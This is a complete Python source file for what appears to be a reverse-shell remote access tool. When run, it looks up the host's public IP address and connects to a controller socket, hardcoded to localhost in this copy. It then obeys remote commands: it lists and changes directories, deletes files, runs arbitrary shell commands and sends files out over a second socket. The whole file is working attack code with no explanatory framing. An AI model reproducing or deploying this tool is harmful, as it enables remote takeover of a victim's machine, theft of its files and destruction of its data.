import socket
import os
import subprocess
import urllib.request


def pwd():
    """Return current working directory."""
    return os.getcwd()


def whoami():
    """Return user."""
    return os.getlogin()


def ls():
    """Return list of items in directory"""
    return os.listdir()


def cd(new_directory):
    """Change parent working directory."""
    os.chdir(new_directory)


def shred(item_path):
    """Remove folder or directory."""
    if os.path.isdir(item_path):
        os.rmdir(item_path)
    else:
        os.remove(item_path)


def send(connection_socket, target_file_path):
    """Open and send raw file data."""
    with open(target_file_path, 'rb') as file:
        while True:
            data = file.read(1024)
            if not data:
                break
            connection_socket.sendall(data)
    connection_socket.close()


def command(cmd):
    """Execute command and return process with its stdout and stderr."""
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc


def publish():
    """Get IP address."""
    r = urllib.request.urlopen('https://api.ipify.org')
    ip_address = r.read().decode()
    print(ip_address)


def main():
    publish()

    conn = socket.socket()
    conn.connect(('127.0.0.1', 9999))

    while True:
        cwd = pwd()
        conn.sendall(f"\n{cwd}:~$$$ ".encode())
        cmd = conn.recv(4096).decode()

        if cmd.lower().rstrip() == "pwd":
            conn.sendall(pwd().encode())
            continue

        elif cmd.lower().rstrip() == "whoami":
            conn.sendall(whoami().encode())
            continue

        elif cmd.lower().rstrip() == "ls":
            try:
                for item in ls():
                    conn.sendall(f"{item}\n".encode())
                continue
            except Exception as e:
                conn.sendall(f"Could not list directory: {e}\n".encode())
                continue

        elif cmd.lower().rstrip().startswith('cd'): 
            split_command = cmd.split()
            new_directory = ' '.join(split_command[1:])
            try:
                cd(new_directory)
                continue
            except Exception as e:
                conn.sendall(f"Could not change directory: {e}\n".encode())
                continue

        elif cmd.lower().rstrip().startswith('shred'):
            split_command = cmd.split()
            item = split_command[1]
            try:
                if os.path.isdir(item):
                    os.rmdir(item)
                else:
                    os.remove(item)
                continue
            except Exception as e:
                conn.sendall(f"Could not remove item: {e}".encode())
                continue

        elif cmd.lower().rstrip().startswith('send'):
            split_command = cmd.split()
            file_path = ' '.join(split_command[1:])
            try:
                send_socket = socket.socket()
                send_socket.connect(('127.0.0.1', 10000))
                send(send_socket, file_path)
                conn.sendall(f"Sent file: {split_command[1]}".encode())
                continue
            except Exception as e:
                conn.sendall(f"Could not send file: {e}".encode())
                continue

        elif cmd.lower().rstrip().startswith('command'):
            split_command = cmd.split()
            process = command(' '.join(split_command[1:]))
            if process.stdout:
                conn.sendall(process.stdout)
                continue
            else:
                conn.sendall(process.stderr)
                continue

        elif cmd.lower().rstrip() == "exitnow":
            conn.sendall(b">>>>> Closing connection.\n")
            conn.close()
            break
    
main()